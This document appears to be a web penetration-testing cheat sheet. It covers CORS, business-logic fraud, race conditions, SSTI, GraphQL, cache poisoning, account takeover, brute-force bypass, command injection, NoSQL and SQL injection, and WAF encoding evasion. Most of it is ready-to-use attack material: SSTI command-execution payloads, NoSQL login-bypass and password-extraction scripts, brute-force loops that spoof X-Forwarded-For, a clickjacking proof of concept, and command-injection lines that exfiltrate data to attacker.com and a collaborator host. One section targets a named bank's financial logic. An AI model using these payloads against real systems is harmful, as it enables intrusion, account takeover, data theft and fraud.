## CORS Exploitation

```bash
# Test: does origin reflect + allow credentials?
curl -sI -H "Origin: https://evil.com" https://target.com/api/user/me

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → Attacker reads authenticated responses cross-origin
```

---

## Business Logic — Flaw Categories (12)

| # | Category | Example | Impact |
|---|----------|---------|--------|
| 1 | Negative values | Transfer amount: `-1000` (receive instead of send) | Financial fraud |
| 2 | Integer overflow/underflow | Quantity: `2147483647 + 1` wraps to negative → negative price | Free/refunded items |
| 3 | Client-side price trust | Intercept POST, change `price=0.01` | Buy anything for pennies |
| 4 | Discount/coupon abuse | Apply same coupon twice, or alternate two coupons infinitely | Unlimited discounts |
| 5 | Workflow sequence skip | Skip payment step, go directly to order confirmation | Free purchases |
| 6 | Parameter removal | Remove `current_password` from change-password request | Password change without knowing current |
| 7 | Inconsistent state validation | Add items to hit $1000 threshold → get discount → remove items → checkout | Discount on sub-threshold order |
| 8 | Trusted user escalation | Pass initial checks → later modify role/email without re-validation | Privilege escalation |
| 9 | Encryption oracle | User-controlled input encrypted → use to forge valid encrypted tokens | Auth bypass, cookie forgery |
| 10 | Email parser discrepancy | `admin@target.com(@attacker.com)` or `admin@target.com%00@attacker.com` | Register as admin domain user |
| 11 | Type confusion | String "0" vs integer 0, array vs string in PHP comparisons | Auth bypass, logic bypass |
| 12 | Infinite loops/money | Coupon gives credit → credit buys gift card → gift card gives credit → repeat | Unlimited funds |

### Unconventional Input Testing

```bash
# For EVERY numeric parameter, test:
# 1. Negative values
amount=-1000
quantity=-1
price=-0.01

# 2. Zero
amount=0
quantity=0

# 3. Extremely large values (integer overflow)
amount=2147483647        # INT_MAX (32-bit)
amount=9999999999999999  # Exceeds 64-bit in some languages
quantity=99999999

# 4. Decimal where integer expected
quantity=1.5
quantity=0.0001

# 5. Boundary values
amount=999.99   # Just below threshold
amount=1000.01  # Just above threshold

# 6. String where number expected
amount=abc
quantity=null
price=undefined

# 7. Array where scalar expected (PHP type juggling)
# POST: amount[]=1000 instead of amount=1000
```

### Workflow Bypass Testing

```bash
# 1. Map the multi-step process
# Step 1: GET /cart → Step 2: POST /checkout → Step 3: POST /confirm-payment → Step 4: GET /order-complete

# 2. Skip steps — go directly to final step
curl -X POST https://target.com/order-complete \
  -H "Cookie: session=VALID_SESSION" \
  -d "order_id=123"

# 3. Repeat steps (double-charge, double-credit)
# Submit payment confirmation twice rapidly

# 4. Go backwards (return to earlier step after completing later one)
# Complete payment → go back to cart → modify items → proceed without re-paying

# 5. Access step with different user's session
# Complete steps 1-2 as user A, submit step 3 with user B's session

# 6. Remove parameters from intermediate steps
# POST /change-password without current_password field
curl -X POST https://target.com/change-password \
  -H "Cookie: session=VALID" \
  -d "new_password=hacked&confirm_password=hacked"
# (omit current_password entirely — server may not check if field is absent)
```

### Client-Side Trust Exploitation

```bash
# 1. Price manipulation (intercept and modify)
# Original: POST /cart/add {"product_id":1,"price":999.99,"quantity":1}
# Modified: POST /cart/add {"product_id":1,"price":0.01,"quantity":1}

# 2. Role/permission in hidden fields
# Original: <input type="hidden" name="role" value="user">
# Modified: role=admin

# 3. Discount percentage in request
# Original: POST /apply-discount {"code":"SAVE10","discount":10}
# Modified: POST /apply-discount {"code":"SAVE10","discount":100}

# 4. Quantity limits enforced only client-side
# Max quantity shown as 10 in UI, but server accepts 99999
```

### Coupon/Discount Logic Abuse

```bash
# 1. Apply same coupon multiple times
POST /apply-coupon {"code":"SAVE20"}
POST /apply-coupon {"code":"SAVE20"}  # Does it stack?

# 2. Alternate two coupons (bypass "already applied" check)
POST /apply-coupon {"code":"SAVE20"}
POST /apply-coupon {"code":"NEWUSER"}
POST /apply-coupon {"code":"SAVE20"}  # Re-apply first
# Some apps only check if the SAME code was last applied

# 3. Apply coupon after price adjustment
# Add expensive items → apply coupon → remove items → checkout
# Discount calculated on original total, applied to reduced total

# 4. Negative quantity + coupon
# quantity=-1 with coupon = credit added to account?

# 5. Currency confusion
# If app supports multiple currencies, buy in cheap currency, refund in expensive one
```

### Email Parser Exploitation

```bash
# Register with restricted domain email using parser discrepancies
# Target: only @target.com emails get admin access

# Encoded @ symbol
admin@target.com%00@attacker.com     # Null byte truncation
admin@target.com(@attacker.com)      # RFC 5322 comment
admin@target.com\n@attacker.com      # Newline injection

# Quoted local part (RFC allows almost anything in quotes)
"admin@target.com"@attacker.com      # Quoted string
admin@target.com%0d%0a@attacker.com  # CRLF

# Subaddressing
admin+anything@target.com            # May bypass uniqueness check
admin@target.com.attacker.com        # Subdomain confusion

# UTF-8 homoglyphs
admin@tаrget.com  # Cyrillic 'а' instead of Latin 'a'
```

### Banking/Financial Logic (BFI/Jago Specific)

```bash
# 1. Transfer to self (circular)
# Transfer $1000 from account A to account A — does balance increase?

# 2. Concurrent transfers (race condition + logic)
# Balance: $1000. Send two $900 transfers simultaneously.
# If balance check happens before deduction: both succeed = $800 overdraw

# 3. Fee bypass
# Transfer $100 with fee $5. Set amount to $100, fee to -$5?
# Or: transfer $0.01 (below minimum fee threshold)

# 4. Loan/credit logic
# Apply for loan → get approved → change amount before disbursement
# Or: multiple simultaneous loan applications

# 5. Interest calculation abuse
# Deposit → earn interest → withdraw before interest reversal period

# 6. Transaction limit bypass
# Daily limit $10,000. Send $9,999 × 10 in rapid succession.
# Or: use different channels (API vs mobile vs web) to bypass per-channel limits
```

---

## Race Condition — Targets

| Action | Expected Bug | Impact |
|--------|-------------|--------|
| Coupon/voucher redemption | Double-spend | Financial |
| Like/vote/follow | Inflated counts | Integrity |
| File upload then process | Upload malicious + bypass check | RCE/XSS |
| Account balance operations | Overdraw/double-spend | Financial |
| Invite/referral bonus | Unlimited bonuses | Financial |
| Limited resource allocation | Exceed quota | Resource abuse |
| Password reset + login | Reset old password, login with old | Auth bypass |

### Race Condition Testing

```python
# Python async (true parallel)
import asyncio, aiohttp

async def race_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as resp:
        return resp.status, await resp.text()

async def exploit_race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, data, headers) for _ in range(n)]
        results = await asyncio.gather(*tasks)
        for i, r in enumerate(results):
            print(f"Request {i}: {r[0]}")

asyncio.run(exploit_race(
    url="https://target.com/api/redeem",
    data={"code": "PROMO50"},
    headers={"Authorization": "Bearer TOKEN"},
    n=20
))
```

---

## Business Logic — Bypass Patterns

```
# Negative/zero value bypass
POST /api/transfer {"amount": -100}     → credits attacker, debits victim
POST /api/cart {"quantity": 0}          → adds item free
POST /api/refund {"amount": 99999}      → refunds more than purchased

# Workflow step skip
Normal: select plan → add payment → confirm → activate
Attack: skip to /confirm?plan=premium&skip_payment=true

# Parameter pollution
POST /api/transfer?from=attacker&to=victim&amount=100&from=victim
# Which 'from' does the server use? Backend and WAF may disagree.

# JSON duplicate keys
{"user":"attacker","user":"admin"}  # Which one wins?
```

---

## SSTI — Detection & RCE Payloads

### Detection (try all on input fields)

```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (confirms not Twig)
```

### RCE Payloads

```python
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP/Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Thymeleaf (Spring)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

---

## GraphQL — Exploitation

```graphql
# Introspection (even when "disabled" — try GET, different content types)
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# IDOR via node() — bypasses per-object auth
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }

# Alias-based enumeration
{
  a1: user(id: "1") { email }
  a2: user(id: "2") { email }
  a3: user(id: "3") { email }
}

# Batching for rate limit bypass
[
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"},
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0003\"){token}}"}
]

# Suggestion abuse (field discovery when introspection is off)
{ use }
# Error: "Did you mean 'user'? 'users'? 'userAdmin'?"
```

---

## Cache Poisoning / Web Cache Deception

### Cache Poisoning (unkeyed header injection)

```bash
# Find unkeyed headers reflected in response
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -s "https://target.com/" -H "X-Forwarded-Scheme: http" | grep "http://"
curl -s "https://target.com/" -H "X-Original-URL: /admin" | grep "admin"

# If reflected + cached → all users get poisoned response
```

### Web Cache Deception (trick cache into storing private data)

```bash
# Victim visits (via link):
https://target.com/account/settings/nonexistent.css
# Cache sees .css → caches the private response
# Attacker requests same URL → gets victim's data

# Variants:
/account/settings%2F..%2Fstatic.css
/account/settings;.css
/account/settings/.css
```

---

## ATO — Account Takeover Paths (5 primary)

| # | Path | Technique |
|---|------|-----------|
| 1 | Password reset poisoning | `Host: attacker.com` or `X-Forwarded-Host: attacker.com` on reset request |
| 2 | Reset token in Referer leak | Page loads external JS → Referer header contains token |
| 3 | Predictable reset tokens | Sequential or timestamp-based tokens → brute force |
| 4 | Token not expiring | Old tokens still valid after new ones issued |
| 5 | Email change without re-auth | `PUT /api/user/email {"new_email": "attacker@evil.com"}` — no password required |

---

## Authentication — Brute Force & Bypass (14)

| # | Technique | How | Detection Signal |
|---|-----------|-----|-----------------|
| 1 | Username enumeration (error message) | Different error for valid vs invalid username | "Invalid password" vs "Invalid username or password" |
| 2 | Username enumeration (status code) | Valid user returns 302, invalid returns 200 | Status code difference on login |
| 3 | Username enumeration (response timing) | Valid user → password check (slow), invalid → instant reject | Use long password to amplify timing |
| 4 | Username enumeration (account lock) | Lock message only appears for valid usernames | "Account locked" = username exists |
| 5 | IP block reset bypass | Interleave own valid creds every N attempts | Counter resets on successful login |
| 6 | Password spray (avoid lockout) | 2-3 passwords × many users (stay under lock threshold) | No lockout triggered per-account |
| 7 | Credential stuffing | Leaked username:password pairs (1 attempt per user) | Bypasses account lockout entirely |
| 8 | Multiple creds per request | JSON array: `[{"user":"a","pass":"1"},{"user":"a","pass":"2"}]` | Bypasses rate limiting (1 request = N attempts) |
| 9 | 2FA logic flaw (account swap) | Login as attacker, change `account=victim` cookie at step 2 | 2FA verified for wrong user |
| 10 | 2FA brute-force with re-login | Auto-login → submit OTP → if wrong, re-login → repeat | Bypasses "3 wrong = logout" protection |
| 11 | Remember-me cookie crack | `base64(user:md5(password))` → crack hash, forge cookie | Predictable cookie construction |
| 12 | Password reset token not validated | Token checked on GET (load form) but not on POST (submit) | Delete token param from POST, change username |
| 13 | Password change username injection | Hidden `username` field in change-password form → change to victim | Modify hidden field in request |
| 14 | HTTP basic auth brute-force | `Authorization: Basic base64(user:pass)` — often no rate limit | No lockout on basic auth endpoints |

### Username Enumeration Methodology

```bash
# 1. Error message difference
# Send known-invalid username → note exact error text
# Send valid username + wrong password → compare
# Even 1 character difference (period, space, capitalization) = enumerable

# 2. Response timing (use long password to amplify)
# ffuf with 100-char password against username wordlist
ffuf -w usernames.txt -u https://target.com/login \
  -X POST -d "username=FUZZ&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -ft "time:>500"  # filter responses taking >500ms

# 3. Account lock enumeration
# Send 5+ wrong passwords per username
# Username that triggers "locked" message = valid
for user in $(cat usernames.txt); do
  for i in $(seq 1 6); do
    curl -s https://target.com/login -d "username=$user&password=wrong$i" | grep -l "locked"
  done
done

# 4. Registration/forgot-password enumeration
# "Email already registered" or "No account with that email"
curl -s https://target.com/register -d "email=FUZZ@target.com" 
curl -s https://target.com/forgot-password -d "email=FUZZ@target.com"
```

### Brute-Force Protection Bypass

```bash
# IP block reset: interleave own valid login every N attempts
# Wordlist structure (if lockout after 3 failures):
victim:password1
victim:password2
attacker:known_password    ← resets IP counter
victim:password3
victim:password4
attacker:known_password    ← resets again
...

# X-Forwarded-For rotation (if backend trusts proxy headers)
for i in $(seq 1 1000); do
  curl -s https://target.com/login \
    -H "X-Forwarded-For: 192.168.1.$((i % 255))" \
    -d "username=admin&password=$(sed -n "${i}p" passwords.txt)"
done

# Multiple credentials per request (JSON array)
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":["pass1","pass2","pass3","pass4","pass5"]}'

# GraphQL batching for brute-force (bypasses per-request rate limit)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(user:\"victim\",pass:\"pass1\"){token}}"},
    {"query":"mutation{login(user:\"victim\",pass:\"pass2\"){token}}"},
    {"query":"mutation{login(user:\"victim\",pass:\"pass3\"){token}}"}
  ]'
```

### 2FA Logic Flaw Exploitation

```bash
# Scenario: Login sets account cookie, 2FA verifies based on cookie
# Step 1: Login as attacker (valid creds)
POST /login → username=attacker&password=known
# Response: Set-Cookie: account=attacker; redirect to /login2

# Step 2: Change cookie to victim, brute-force their OTP
POST /login2
Cookie: account=victim
verification-code=0000
# Repeat 0000-9999 (or 000000-999999)

# If logout after N failures: macro to re-login + change cookie + try next code
```

### Remember-Me Cookie Exploitation

```bash
# Identify cookie structure (create account, inspect cookie)
# Common patterns:
# base64(username:md5(password))
# base64(username:sha1(password))
# base64(username:timestamp)
# AES(username+role) with static key

# Decode and analyze
echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
# → carlos:26323c16d5f4dabff3bb136f2460a943
# → md5("password") = 26323c16d5f4dabff3bb136f2460a943

# Forge cookie for target user (if password hash known/cracked)
echo -n "admin:$(echo -n 'password123' | md5sum | cut -d' ' -f1)" | base64
# Use as remember-me cookie value

# Crack hash from stolen cookie (XSS → steal cookie)
hashcat -m 0 hash.txt /opt/homebrew/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

### Password Reset Logic Flaws

```bash
# 1. Token not validated on POST
# Normal flow: GET /reset?token=abc123 → shows form
# Submit: POST /reset → token=abc123&new_password=hacked
# Attack: POST /reset → username=victim&new_password=hacked (no token!)

# 2. Token reuse (not invalidated after use)
# Use valid token → reset password → use SAME token again

# 3. Token shared across users
# Request reset for attacker → get token
# Use token but change username to victim in POST

# 4. Password change function abuse
# POST /change-password
# username=victim&current-password=anything&new-password=hacked
# (username in hidden field, current-password not validated for other users)

# 5. Host header poisoning for reset link
POST /forgot-password HTTP/1.1
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

username=victim
# Reset email sent to victim contains: https://attacker-server.com/reset?token=SECRET
# Victim clicks → token sent to attacker
```

---

## HTTP Method Override (WAF Bypass)

```bash
curl -X POST https://target.com/api/admin/users -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/admin/users -H "X-Method-Override: PUT"
curl -X POST https://target.com/api/admin/users -H "X-Original-Method: PATCH"
```

---

## Mass Assignment — Common Fields to Inject

```json
{
  "role": "admin",
  "is_admin": true,
  "verified": true,
  "credits": 999999,
  "permissions": ["*"],
  "email_verified": true,
  "account_type": "premium"
}
```

### Mass Assignment Discovery Methodology

```bash
# 1. GET the object to see ALL fields returned by the API
curl -s https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq .
# Response: {"id":123,"username":"attacker","email":"a@b.com","isAdmin":false,"role":"user","credits":0}

# 2. Compare with what PATCH/PUT accepts (documented fields)
# Usually only username/email are documented as editable

# 3. Try adding hidden fields from GET response to PATCH/PUT
curl -X PATCH https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","isAdmin":true}'

# 4. Test with invalid value to confirm field is processed
curl -X PATCH https://target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","isAdmin":"foo"}'
# Different error vs valid value = field IS processed

# 5. Also check: registration endpoints often accept more fields
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"new","password":"pass","email":"x@y.com","role":"admin"}'
```

### API Documentation Endpoints to Check

```bash
# Swagger/OpenAPI
/swagger.json /swagger/v1/swagger.json /swagger-ui.html /swagger-ui/
/api-docs /api-docs.json /v1/api-docs /v2/api-docs /v3/api-docs
/openapi.json /openapi.yaml /openapi/v3/api-docs

# GraphQL
/graphql /__graphql /graphiql /playground /altair

# Other
/api /api/ /api/v1 /api/v2 /_api /internal/api
/.well-known/openid-configuration
/actuator/mappings  # Spring Boot — lists ALL endpoints
```

---

## Clickjacking — Quick Check

**Detection (1 command):**
```bash
# Check if target is frameable
curl -sI "https://target.com/" | grep -iE "(x-frame-options|frame-ancestors)"
# No header = frameable = potential clickjacking
```

**Severity:**
- Missing X-Frame-Options/CSP frame-ancestors alone = **Low/Info**
- Frameable + state-changing action without CSRF token = **Medium**
- Frameable + DOM XSS trigger via click = **High**
- Frameable + financial transaction (transfer, approve) = **High**

**PoC template:**
```html
<html><head><style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  div { position:absolute; top:300px; left:60px; z-index:1; }
</style></head><body>
<div><h1>Click here to win!</h1><button>CLAIM PRIZE</button></div>
<iframe src="https://target.com/account/settings/delete"></iframe>
</body></html>
```

**Frame-buster bypass (if JS-based protection only):**
```html
<iframe src="https://target.com/" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox without allow-top-navigation blocks frame-buster JS -->
```

---

## Subdomain Takeover — Fingerprints

```
"There isn't a GitHub Pages site here"  → GitHub Pages (register repo)
"NoSuchBucket"                          → AWS S3 (create bucket)
"No such app"                           → Heroku (create app)
"404 Web Site not found"                → Azure App Service
"Fastly error: unknown domain"          → Fastly CDN
"project not found"                     → GitLab Pages
```

### Impact Escalation

```
Basic takeover                         → Low/Medium
+ Cookies scoped to .target.com        → High (credential theft)
+ OAuth redirect_uri on subdomain      → Critical (ATO)
+ CSP allowlist includes subdomain     → Critical (XSS anywhere)
```

---

## OS Command Injection — Separators & Blind Techniques

> **Full filter bypass catalog:** See `command-injection-filter-bypasses.md` for 20+ techniques (no-space, no-slash, keyword evasion, hex/octal encoding, brace expansion, argument injection, WorstFit, polyglots).

### Command Separators

| Separator | Linux | Windows | Behavior |
|-----------|-------|---------|----------|
| `&` | ✅ | ✅ | Run both (background first) |
| `&&` | ✅ | ✅ | Run second only if first succeeds |
| `\|` | ✅ | ✅ | Pipe output of first to second |
| `\|\|` | ✅ | ✅ | Run second only if first fails |
| `;` | ✅ | ❌ | Run sequentially |
| `\n` (0x0a) | ✅ | ❌ | Newline = new command |
| `` `cmd` `` | ✅ | ❌ | Inline execution (backticks) |
| `$(cmd)` | ✅ | ❌ | Inline execution (subshell) |

### Quick Detection Payloads

```bash
# In-band (output visible in response)
; id
| id
& echo CMDI_CONFIRMED &
$(whoami)

# Blind — time delay
& ping -c 10 127.0.0.1 &          # 10s delay = confirmed
& sleep 10 &                        # Linux
& ping -n 10 127.0.0.1 &           # Windows (10s)
| timeout /t 10 |                   # Windows alt

# Blind — output redirection (if web root writable)
& whoami > /var/www/static/cmdi.txt &
# Then fetch: https://target.com/static/cmdi.txt

# Blind — OOB via DNS (best for confirming blind CMDi)
& nslookup attacker.com &                              # Basic callback
& nslookup `whoami`.COLLABORATOR_ID.oastify.com &      # Exfil via subdomain
& curl https://attacker.com/cmdi?d=$(whoami) &         # Exfil via HTTP
$(nslookup $(whoami).COLLABORATOR_ID.oastify.com)      # Inline subshell
```

### Quoted Context Breakout

```bash
# If input lands inside quotes: command "USER_INPUT"
# Break out first, then inject:
"; id; #                    # Close double quote, inject, comment rest
'; id; #                    # Close single quote
`id`                        # Backticks execute inside double quotes (not single)
$(id)                       # Subshell executes inside double quotes (not single)
```

### Where to Test (Spring Boot / Java Context)

- PDF/report generation endpoints (wkhtmltopdf, LibreOffice)
- File conversion features (ImageMagick, ffmpeg)
- Email sending (if shelling out to sendmail/postfix)
- Monitoring/health scripts triggered via API
- Any parameter that looks like a filename or path
- Webhook/callback URLs (if server fetches via curl/wget)

---

## NoSQL Injection — MongoDB (10 Techniques)

| # | Technique | Payload | Impact |
|---|-----------|---------|--------|
| 1 | Operator auth bypass ($ne) | `{"username":{"$ne":""},"password":{"$ne":""}}` | Login as first user in collection |
| 2 | Operator auth bypass ($gt) | `{"username":"admin","password":{"$gt":""}}` | Login as admin |
| 3 | Operator auth bypass ($in) | `{"username":{"$in":["admin","root"]},"password":{"$ne":""}}` | Target specific accounts |
| 4 | Syntax injection (always true) | `' || '1'=='1` or `'||1||'` | Dump all records |
| 5 | Null byte truncation | `category=fizzy'\u0000` | Ignore remaining query conditions |
| 6 | $regex data extraction | `{"password":{"$regex":"^a.*"}}` | Extract data char-by-char |
| 7 | $where JavaScript injection | `"$where":"this.password[0]=='a'"` | Boolean-based extraction |
| 8 | $where timing injection | `"$where":"sleep(5000)"` | Blind detection via delay |
| 9 | Field name enumeration | `"$where":"Object.keys(this)[0].match('^.{0}a.*')"` | Discover unknown fields |
| 10 | URL param operator injection | `username[$ne]=invalid&password[$ne]=invalid` | Auth bypass via GET/POST params |

### Detection — Fuzz Strings

```bash
# MongoDB fuzz string (inject into every parameter)
'"`{
;$Foo}
$Foo \xYZ

# URL-encoded version:
%27%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

# JSON version (for API bodies):
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000

# Single character tests (determine which break syntax):
'    →  syntax error = injectable
\'   →  no error = confirms injection
\\   →  test escape handling
```

### Operator Injection — Authentication Bypass

```bash
# JSON body — bypass login (returns first user)
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Target admin specifically
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# Using $gt (greater than empty string = any non-empty password)
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# Using $regex (password matches anything)
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'

# URL parameter form (when JSON not accepted)
curl -X POST https://target.com/login \
  -d "username[$ne]=invalid&password[$ne]=invalid"

# Or convert GET to POST with JSON:
# Change Content-Type: application/x-www-form-urlencoded
# To: Content-Type: application/json
# And restructure body as JSON with operators
```

### Syntax Injection — Data Extraction

```bash
# Boolean-based extraction (character by character)
# True condition (returns data):
admin' && this.password[0] == 'a' || 'a'=='b
# False condition (no data):
admin' && this.password[0] == 'z' || 'a'=='b

# Automate with script:
for char in {a..z} {0..9}; do
  resp=$(curl -s "https://target.com/user/lookup?username=admin'+%26%26+this.password[0]=='$char'+||+'a'=='b")
  if echo "$resp" | grep -q "admin"; then
    echo "[+] First char: $char"
    break
  fi
done

# Using match() for regex-based extraction:
admin' && this.password.match(/^a/) || 'a'=='b
admin' && this.password.match(/\d/) || 'a'=='b  # contains digits?
admin' && this.password.length == 8 || 'a'=='b  # password length?
```

### Operator Injection — Data Extraction ($regex)

```bash
# Extract password character by character via $regex
# Test first char:
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a.*"}}'
# If login succeeds → first char is 'a'

# Automate:
PASSWORD=""
for pos in $(seq 0 20); do
  for char in {a..z} {A..Z} {0..9}; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${PASSWORD}${char}.*\"}}")
    if [ "$resp" == "302" ]; then
      PASSWORD="${PASSWORD}${char}"
      echo "[+] Password so far: $PASSWORD"
      break
    fi
  done
done
```

### Field Name Enumeration

```bash
# Discover unknown fields using Object.keys()
# Extract first field name character by character:
"$where":"Object.keys(this)[0].match('^.{0}a.*')"  # 1st field, 1st char = 'a'?
"$where":"Object.keys(this)[0].match('^.{1}b.*')"  # 1st field, 2nd char = 'b'?
"$where":"Object.keys(this)[1].match('^.{0}p.*')"  # 2nd field, 1st char = 'p'?

# Or check if field exists (simpler):
admin' && this.password != '' || 'a'=='b     # password field exists?
admin' && this.secret != '' || 'a'=='b       # secret field exists?
admin' && this.resetToken != '' || 'a'=='b   # resetToken field?
```

### Timing-Based Blind NoSQL Injection

```bash
# When no visible difference in response:
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test","$where":"sleep(5000)"}' \
  -w "\nTime: %{time_total}s\n"
# If response takes 5+ seconds → $where is evaluated

# Conditional timing:
"$where":"if(this.password[0]=='a'){sleep(5000)}else{return false}"
# 5s delay = char is correct
```

### NoSQL Injection via WebSocket

```bash
# If API uses WebSocket with MongoDB backend:
websocat "wss://target.com/ws" <<< '{"action":"find","filter":{"$gt":""}}'
websocat "wss://target.com/ws" <<< '{"action":"login","username":{"$ne":""},"password":{"$ne":""}}'
```

---

## SQL Injection — Advanced Injection Points & Second-Order

### Non-WHERE Injection Points

Most SQLi testing focuses on WHERE clauses. Don't forget these:

| Location | Detection | Payload Difference |
|----------|-----------|-------------------|
| ORDER BY clause | `?sort=name` → `?sort=name,(SELECT 1)` | No quotes needed, numeric/expression context |
| INSERT values | Registration forms, logging | `','')-- ` closes the VALUES(), injects new row |
| UPDATE SET | Profile update, settings | `',email='attacker@evil.com' WHERE username='admin'--` |
| Table/column name | Dynamic reports, pivot tables | Backticks/brackets required: `` `(SELECT 1)` `` |
| LIMIT/OFFSET | Pagination params | `?limit=1;SELECT sleep(5)` (stacked queries if supported) |
| GROUP BY / HAVING | Aggregation endpoints | `?group=1 HAVING 1=1--` |

```bash
# ORDER BY injection (no quotes, numeric context)
curl -sk "https://target.com/api/users?sort=1,(CASE+WHEN+(1=1)+THEN+1+ELSE+1/0+END)"
# If 200 → boolean-based blind in ORDER BY

# INSERT injection (registration form)
curl -sk -X POST "https://target.com/register" \
  -d "username=test','admin')--&password=x&email=x"
```

### Second-Order (Stored) SQL Injection

Input is stored safely (parameterized INSERT), but later used unsafely in a different query.

**Where to look:**
- User registration → username used in backend report generation
- Profile fields → displayed in admin dashboard with raw SQL
- File/document names → used in search/filter queries later
- Comments/notes → aggregated into analytics queries

**Testing approach:**
```bash
# Register with SQLi payload as username
curl -sk -X POST "https://target.com/register" \
  -d "username=admin'||(SELECT+version())||'&password=test123&email=test@test.com"

# Trigger the second-order execution (admin views users, generates report, etc.)
# Check if the payload executes when the stored value is used in another query
```

**Key insight:** If the app uses parameterized queries for INSERT but string concatenation for SELECT (common in legacy report generators), the stored payload fires when read back.

---

## Encoding Obfuscation — WAF/Filter Bypass (Cross-Cutting)

These techniques apply across ALL injection types (XSS, SQLi, path traversal, command injection). When a WAF blocks your payload, try encoding it differently — the WAF decodes once, but the backend may decode again.

### URL Encoding (Single)

WAF checks decoded input, but some WAFs skip decoding entirely:

```bash
# SQLi keyword bypass
SELECT → %53%45%4C%45%43%54
UNION  → %55%4E%49%4F%4E
' OR 1=1-- → %27%20%4F%52%20%31%3D%31%2D%2D

# Path bypass
/actuator → /%61ctuator
/admin    → /%61dmin
```

### Double URL Encoding

Backend decodes twice; WAF only decodes once:

```bash
# < becomes %3C becomes %253C
<script>alert(1)</script>
→ %253Cscript%253Ealert(1)%253C/script%253E

# Path traversal
../ → %252e%252e%252f

# Test: curl with double-encoded payload
curl -sk "https://target.com/search?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
```

### HTML Entity Encoding (Client-Side XSS)

Browsers decode HTML entities in attribute values before executing JS:

```html
<!-- Standard HTML encoding -->
<img src=x onerror="&#x61;lert(1)">
<a href="javascript&#58;alert(1)">click</a>

<!-- Leading zeros bypass (WAFs often miss these) -->
<a href="javascript&#00000058;alert(1)">click</a>
<img src=x onerror="&#0000097;lert(1)">

<!-- Named entities -->
<a href="javascript&colon;alert(1)">click</a>

<!-- Decimal encoding -->
<img src=x onerror="&#97;lert(1)">
```

### XML Encoding (SQLi/XXE in XML Bodies)

When injecting into XML/SOAP requests, XML entities bypass WAFs that check raw text:

```xml
<!-- SQLi via XML encoding — WAF sees &#x53; not SELECT -->
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

<!-- Full keyword encoding -->
<!-- UNION SELECT → -->
&#x55;NION &#x53;ELECT

<!-- Works against Cloudflare, ModSecurity, AWS WAF on XML endpoints -->
```

### Unicode Escaping (JavaScript Context)

In JS string contexts, `\uXXXX` is decoded at runtime:

```javascript
// Standard unicode escape
eval("\u0061lert(1)")           // alert(1)
window["\u0061lert"](1)        // alert(1)

// ES6 with leading zeros (bypass WAF pattern matching)
eval("\u{0000000061}lert(1)")  // alert(1)

// Construct function name dynamically
window["\u0061\u006c\u0065\u0072\u0074"](1)  // alert(1)
```

### Hex Escaping (JavaScript String Context)

```javascript
// \xNN in JS strings
eval("\x61lert(1)")            // alert(1)
"\x61\x6c\x65\x72\x74"        // "alert"

// SQL keyword in hex (MySQL)
SELECT → 0x53454c454354
// Usage: WHERE table_name = 0x7573657273  (= "users")
```

### Octal Escaping (JavaScript String Context)

```javascript
// \NNN in JS strings
